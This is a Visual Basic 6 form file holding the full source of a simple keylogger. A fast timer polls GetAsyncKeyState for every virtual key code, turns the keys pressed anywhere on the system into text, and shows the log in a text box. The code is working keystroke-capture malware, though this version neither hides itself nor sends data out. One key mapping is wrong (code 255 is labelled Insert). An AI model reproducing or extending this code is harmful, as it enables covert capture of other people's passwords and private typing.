VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   LinkTopic       =   "Form1"
   ScaleHeight     =   3015
   ScaleWidth      =   4560
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Height          =   975
      Left            =   840
      TabIndex        =   0
      Top             =   360
      Width           =   2175
   End
   Begin VB.Timer TM 
      Interval        =   1
      Left            =   600
      Top             =   2520
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Dim Str As String

Private Sub TM_Timer()
    For i = 1 To 255
        result = 0
        result = GetAsyncKeyState(i)
       ' Print result
       If result = -32767 Then
       'MsgBox (i)
       If (i) = 96 Then
        Str = Str & "0"
        Print "0"
        End If
        If (i) = 97 Then
        Str = Str & "1"
        Print "1"
        End If
       If i = 98 Then
       Str = Str & "2"
       End If
       If i = 99 Then
       Str = Str & "3"
       End If
       If i = 100 Then
       Str = Str & "4"
       End If
       If i = 101 Then
       Str = Str & "5"
       End If
       If i = 102 Then
       Str = Str & "6"
       End If
       If i = 103 Then
       Str = Str & "7"
       End If
       If i = 104 Then
       Str = Str & "8"
       End If
       If i = 105 Then
       Str = Str & "9"
       End If
       If i = 107 Then
       Str = Str & "+"
       End If
       If i = 109 Then
       Str = Str & "-"
       End If
       If i = 13 Then
       Str = Str & "[ENTER]"
       End If
       If i = 106 Then
       Str = Str & "*"
       End If
       If i = 111 Then
       Str = Str & "/"
       End If
       If i = 8 Then
       Str = Str & "[BackSpace]"
       End If
       If i = 16 Then
       Str = Str & "[SHIFT]"
       End If
       If i = 18 Then
       Str = Str & "[ALT]"
       End If
       If i = 17 Then
       Str = Str & "[Control]"
       End If
       If i = 20 Then
       Str = Str & "[CapsLock]"
       End If
       If i = 9 Then
       Str = Str & "[TAB]"
       End If
       If i = 144 Then
       Str = Str & "[NumLock]"
       End If
       If (i > 64 And i < 91) Then
       Str = Str & Chr(i)
       End If
       If i > 47 And i < 58 Then
       Str = Str & Chr(i)
       End If
       If i = 187 Then
       Str = Str & "="
       End If
       If i = 189 Then
       Str = Str & "-"
       End If
       If i = 192 Then
       Str = Str & "`"
       End If
       If i = 32 Then
       Str = Str & "[Space]"
       End If
       If i = 39 Then
       Str = Str & "[Right]"
       End If
       If i = 40 Then
       Str = Str & "[Down]"
       End If
       If i = 37 Then
       Str = Str & "[Left]"
       End If
       If i = 38 Then
       Str = Str & "[Up]"
       End If
       If i = 34 Then
       Str = Str & "[PageDown]"
       End If
       If i = 33 Then
       Str = Str & "[PageUp]"
       End If
       If i = 35 Then
       Str = Str & "[END]"
       End If
       If i = 36 Then
       Str = Str & "[HOME]"
       End If
       If i = 46 Then
       Str = Str & "[DEL]"
       End If
       If i = 255 Then
       Str = Str & "[INSERT]"
       End If
        End If
    
    
    Next i
    Text1.Text = Str
End Sub
